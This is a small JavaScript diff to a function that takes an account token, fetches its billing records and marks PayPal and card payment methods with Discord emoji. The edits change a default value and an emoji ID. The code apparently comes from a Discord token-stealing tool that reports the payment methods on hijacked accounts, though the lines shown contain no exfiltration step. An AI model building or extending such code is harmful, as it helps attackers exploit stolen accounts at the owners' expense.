@@ -192,10 +192,10 @@ const fetchBilling = async (token) => {
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
   if (data === "") return "❌";
-  let billing = "";
+  let billing = "❌";
   data.forEach((x) => {
     if (x.type === 2 && !x.invalid) {
-      billing += "✅" + " <:paypal:951139189389410365>";
+      billing += "✅" + " <:paypal:966392214261493880> ";
     } else if (x.type === 1 && !x.invalid) {
       billing += "✅" + " 💳";
     } else {
